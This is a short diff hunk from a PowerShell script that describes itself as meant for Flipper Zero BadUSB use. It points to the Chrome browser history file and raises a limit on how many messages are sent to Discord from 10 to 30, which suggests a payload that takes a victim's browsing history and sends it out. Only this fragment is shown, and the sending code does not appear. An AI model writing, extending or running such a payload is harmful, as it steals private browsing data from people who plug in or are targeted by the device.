@@ -7,7 +7,7 @@ Technically for use in Flipper Zero BadUSB
 
 
 $filePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\history"
-$maxMsgs = "10" # Maximum number of messages to send to Discord
+$maxMsgs = "30" # Maximum number of messages to send to Discord
 
 # Check if the file exists
 if (!(Test-Path $filePath)) {
